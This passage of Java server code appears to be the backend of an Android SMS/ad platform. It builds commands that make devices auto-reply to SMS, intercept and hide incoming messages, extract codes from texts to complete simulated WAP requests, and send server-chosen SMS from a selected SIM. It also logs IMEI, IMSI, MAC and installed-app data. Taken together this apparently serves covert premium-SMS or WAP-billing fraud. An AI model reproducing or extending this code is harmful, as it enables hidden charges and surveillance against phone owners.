        map.put("delay", delay); // 执行前等待
        map.put("rkword", replyKeyWord); // '回复关键字'
        map.put("rknumber", replyKeyNumber); // '回复关键号码'
        map.put("replayType", replyType); // 回复类型:1、拦截；2、内容(SMS)
        map.put("begin", replyNumber); // 回复号码/拦截开始
        map.put("end", replyContent); // 回复内容/拦截结束
        return map;
    }

    /**
     * 构建wap结点
     */
    private Map<String, Object> generateWap(Integer order, Integer delay, String url, String method, List<ShortProductActiveWap> waps) {
        Map<String, Object> map = new HashMap<String, Object>();
        List<Map<String, Object>> params = new ArrayList<Map<String, Object>>();
        if (!CollectionUtils.isEmpty(waps)) {
            for (ShortProductActiveWap wap : waps) {
                params.add(generateParams(wap.getType(), wap.getKeyw(), wap.getValuew(), wap.getBeginw(), wap.getEndw(), wap.getNumber(), wap.getTime()));
            }
        }
        map.put("type", 2); // 模拟类型：1、回复sms；2、wap；
        map.put("order", order); // 排序号
        map.put("delay", delay); // 执行前等待
        map.put("url", url == null ? "" : url); // URL
        map.put("method", method == null ? "" : method); // 请求方式：1、POST；2、GET
        map.put("params", params); // 需要拼接的参数列表
        return map;
    }

    /**
     * 构建wap参数结点
     */
    private static Map<String, Object> generateParams(Integer type, String key, String value, String begin, String end, String number, Integer time) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("type", type); // 参数类型：1、直接参数；2、方法；3、截取；
        map.put("key", key); // 参数名
        map.put("value", value == null ? "" : value); // 值或方法，当参数类型为1、2时可用
        map.put("begin", begin == null ? "" : begin); // 拦截开始(参数3可用)
        map.put("end", end == null ? "" : end); // 拦截结束(参数3可用)
        map.put("number", number == null ? "" : number); // 截取号码(参数3可用)
        map.put("time", time); // 截取多长时间内的信息(参数3可用)
        return map;
    }

    @Override
    public Map<String, Object> getPadv(ShortDevice device, VisitAdsms visit, ShortCustomer customer, String currentdate) {
        Map<String, Object> result = new HashMap<String, Object>();
        List<ShortDeviceImsi> deviceImsis = device.getDeviceImsis();
        if (CollectionUtils.isEmpty(deviceImsis)) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_SM_NULL);
            return null;
        }
        // 客户过滤
        if (customer == null) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_NULL);
            return null;
        }
        if (NumberUtils.INTEGER_ZERO.equals(customer.getStatus())) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_STATUS);
            return null;
        }
        String currentTime = new SimpleDateFormat("HH:mm").format(visit.getAccesstime()); // 当前时刻
        if (!DateUtils.betweenTime(customer.getBegintime(), customer.getEndtime(), currentTime, "HH:mm")) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_TIME);
            return null;
        }
        String cityid = "|" + visit.getCountryId() + "|";
        String cityid0 = device.getCityid0() == null ? cityid : "|" + device.getCityid0() + "|";
        String cityid1 = device.getCityid1() == null ? cityid : "|" + device.getCityid1() + "|";
        String customerCitys = customer.getCitys() == null ? "" : customer.getCitys();
        if (!customerCitys.contains(cityid0) && !customerCitys.contains(cityid1)) {
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_CITY);
            return null;
        }

        int cApkdays = customer.getApkdays(); // 发送频率
        int cApkdown = customer.getApkdown(); // TODO 月值
        String imsi0 = device.getImsi0();
        String imsi1 = device.getImsi1();
        String customerid = customer.getCustomerid();
        int cProvider = customer.getProvider() == null ? 0 : customer.getProvider();
        Map<String, Object> padv0 = null;
        int providerCode0 = InterfaceUtil.getProviderCode(imsi0);
        visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_CUSTOMER_PROVIDER);
        if (cProvider == 0 || providerCode0 == cProvider) {
            padv0 = generatePadv(visit, cApkdays, imsi0, device.getLastpadv0(), customerid, cityid0, 0);
            if (!CollectionUtils.isEmpty(padv0)) {
                visit.setRunlevel(Constants.RUNLEVEL_SUCCESS_IMSI0);
                result.put("padv", padv0);
                result.put("providerCode", providerCode0);
                return result;
            }
        }
        int providerCode1 = InterfaceUtil.getProviderCode(imsi1);
        if (cProvider == 0 || providerCode1 == cProvider) {
            padv0 = generatePadv(visit, cApkdays, imsi1, device.getLastpadv1(), customerid, cityid1, 1);
            if (!CollectionUtils.isEmpty(padv0)) {
                visit.setRunlevel(Constants.RUNLEVEL_SUCCESS_IMSI1);
                result.put("padv", padv0);
                result.put("providerCode", providerCode1);
                return result;
            }
        }
        return null;
    }

    private Map<String, Object> generatePadv(VisitAdsms visit, int cApkdays, String imsi, Date lastpadv, String customerid, String cityid, int slot) {
        int providerCode = InterfaceUtil.getProviderCode(imsi);
        if (StringUtils.isNotBlank(imsi) && providerCode > 0) {
            boolean sendflag0 = true;
            if (lastpadv != null) {
                int daybetw = DateUtils.daysBetween(lastpadv, visit.getAccesstime(), "yyyy-MM-dd");
                if (daybetw < cApkdays) {
                    sendflag0 = false;
                }
            }
            visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_IMSI0_TIME);
            if (sendflag0) {
                Map<String, Object> result = new HashMap<String, Object>();
                ShortPadv padv = shortPadvManager.getPadv(customerid, cityid, providerCode);
                visit.setRunlevel(Constants.RUNLEVEL_INTERCEPT_PADV_IMSI0_NODATA);
                if (padv != null) {
                    String content = padv.getContent();
                    String userid = padv.getPnum();
                    Integer delay = padv.getDelay();
                    Integer mValue = padv.getValue(); // 有效值：用于计算月值

                    result.put("userid", userid);
                    result.put("delay", delay); // 发送间隔
                    result.put("content", content);
                    result.put("slot", slot);
                    // 写发送日志
                    ShortLogPadv log = new ShortLogPadv(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), NumberUtils.toLong(cityid.replaceAll("\\|", "")), customerid,
                            imsi, padv.getId());
                    shortLogPadvManager.save(log);

                    // imsi设备表
                    ShortDeviceImsi deviceImsi = shortDeviceImsiManager.getDeviceByImsi(imsi);
                    if (deviceImsi != null) {
                        deviceImsi.setLastpadv(visit.getAccesstime());
                        shortDeviceImsiManager.save(deviceImsi);
                    }
                    return result;
                }
            }
        }
        return null;
    }

    @Override
    public void insertLogErrorCmd(VisitAdsms visit) {
        List<VisitErrorCmd> cmds = visit.getErrorCmd();
        if (!CollectionUtils.isEmpty(cmds)) {
            for (VisitErrorCmd item : cmds) {
                ShortLogErrorCmd log = new ShortLogErrorCmd(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getImsi(), visit.getCountryId(),
                        visit.getCustomerid(), item.getId(), item.getRst());
                shortLogErrorCmdManager.save(log);
            }
        }
    }

    @Override
    public void insertLogErrorUpdate(VisitAdsms visit) {
        String rupg = visit.getUpdatePkg();
        if (StringUtils.isNotBlank(rupg)) {
            ShortLogErrorUpdate log = new ShortLogErrorUpdate(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getImsi(), visit.getCountryId(),
                    visit.getCustomerid(), rupg);
            shortLogErrorUpdateManager.save(log);
        }
    }

    @Override
    public void insertLogUploadpkg(VisitAdsms visit, ShortDevice device) {
        String uploadpkg = visit.getUploadpkg();
        if (StringUtils.isNotBlank(uploadpkg)) {
            device.setPkgs(uploadpkg);
            shortDeviceManager.save(device);
            ShortLogUploadpkg log = new ShortLogUploadpkg(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getImsi(), visit.getCountryId(), visit.getCustomerid(),
                    uploadpkg);
            shortLogUploadpkgManager.save(log);
        }
    }

    @Override
    public void insertLogErrorMobileTime(VisitAdsms visit) {
        ShortLogErrorMobileTime log = new ShortLogErrorMobileTime(visit.getAccesstime(), visit.getDeviceid(), visit.getIp(), visit.getCountryId(), visit.getCountryName(),
                visit.getUrl(), visit.getMac(), visit.getImei(), visit.getImsi(), visit.getAndroidid(), visit.getCustomerid(), visit.getOsVersionCode(), visit.getOsVersionName(),
                visit.getInline(), visit.getLangCountry(), visit.getNetType(), visit.getCpu(), visit.getRomLess(), visit.getSdcardLess(), visit.getRomTotal(),
                visit.getSdcardTotal(), visit.getTest(), visit.getAppVersionCode(), visit.getAppVersionName(), visit.getInitVersionName(), visit.getInitPackageName(),
                visit.getWifi(), visit.getApn(), visit.getSrc(), visit.getBrand(), visit.getModle(), visit.getMobileCurrentTime(), visit.getSign(), visit.getSimParams());
        shortLogErrorMobileTimeManager.save(log);
    }

    @Override
    public String getResponseUrl(String url) {
        Dicitem dicitem = dicManager.findItem("short_config", "responseUrl");
        if (dicitem != null && StringUtils.isNotBlank(dicitem.getVal1())) {
            return dicitem.getVal1();
        } else {
            return url;
        }
    }

    @Override
    public City getByJsonIPInfo(JsonIPInfo info) {
        City result = null;
        String country = info.getCountry();
        String province = info.getProvince();
        String city = info.getCity();
        if (COUNTRY_CHINA.equals(country)) {
            if (StringUtils.isNotBlank(city)) {
                result = cityManager.getByName(city);
                if (result != null) {
                    return result;
                }
                // 记录未在省市表日志
                insertLogCityUndefine(city, province, country, UNDEFILE_LEVEL_CITY);
            }
            if (StringUtils.isNotBlank(province)) {
                result = cityManager.getByName(province);
                if (result == null) {
                    // 记录未在省市表日志
                    insertLogCityUndefine(city, province, country, UNDEFILE_LEVEL_PROVINCE);
                }
            }
        } else {
            if (StringUtils.isNotBlank(country)) {
                result = cityManager.getByName(country);
                if (result == null) {
                    // 记录未在省市表日志
                    insertLogCityUndefine(city, province, country, UNDEFILE_LEVEL_COUNTRY);
                }
            }
        }
        return result;
    }

    /**
     * 写省市未定义日志
     */
    private void insertLogCityUndefine(String city, String province, String country, Integer level) {
        LogCityUndefine log = new LogCityUndefine(city, province, country, level);
        logCityUndefineManager.save(log);
    }
}
